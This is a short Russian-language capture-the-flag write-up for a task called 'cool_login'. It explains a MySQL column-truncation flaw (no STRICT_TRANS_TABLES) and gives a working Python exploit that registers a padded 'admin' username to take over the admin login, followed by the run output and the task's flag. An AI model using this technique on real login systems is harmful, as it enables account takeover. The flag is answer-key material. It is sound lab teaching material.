# cool_login

Уязвимость была в том, что из-за отсутствия дефолтного мода в MySQL (`STRICT_TRANS_TABLES`), при вводе строки, которая превышала заданный размер ячейки, данные обрезались.

Пример эксплойта для решения таска:

[exp.py](exp.py)
```python
import requests
import sys

def cool(username):
    return username + ' so cool'

link = sys.argv[1]

username = "                                     admin"

password = "lol"

assert len(cool(username)) == 50

response = requests.post(f"{link}/register", data={"username": cool(username), "password": password})
print(response.text)

response = requests.post(f"{link}/login", data={"username": username, "password": password})
print(response.text)
```
Запускаем эксплойт:
```bash
$ python3 exp.py link | grep surctf
    <h2>surctf_ohhhhh_n0_u_CuT_th3_l1N3</h2>
```

`flag: surctf_ohhhhh_n0_u_CuT_th3_l1N3`
